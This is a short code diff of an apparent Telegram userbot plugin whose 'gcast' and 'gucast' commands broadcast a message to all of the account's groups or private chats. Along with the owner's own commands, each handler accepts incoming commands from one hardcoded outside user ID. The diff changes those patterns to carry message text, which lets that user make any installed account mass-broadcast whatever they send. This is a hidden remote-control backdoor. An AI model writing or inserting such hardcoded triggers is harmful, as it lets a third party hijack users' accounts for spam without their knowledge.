@@ -3,7 +3,7 @@ from userbot import CMD_HELP, bot
 
 
 @register(outgoing=True, pattern="^.guck (.*)")
-@register(incoming=True, from_users=901878554, pattern=r"^\.cguck$")
+@register(incoming=True, from_users=901878554, pattern=r"^\.cguck (.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if not xx:
@@ -25,7 +25,7 @@ async def gcast(event):
 
 
 @register(outgoing=True, pattern=r"^\.gpm(?: |$)(.*)")
-@register(incoming=True, from_users=901878554, pattern=r"^\.cgpm$")
+@register(incoming=True, from_users=901878554, pattern=r"^\.cgpm(?: |$)(.*)")
 async def gucast(event):
     xx = event.pattern_match.group(1)
     if not xx:
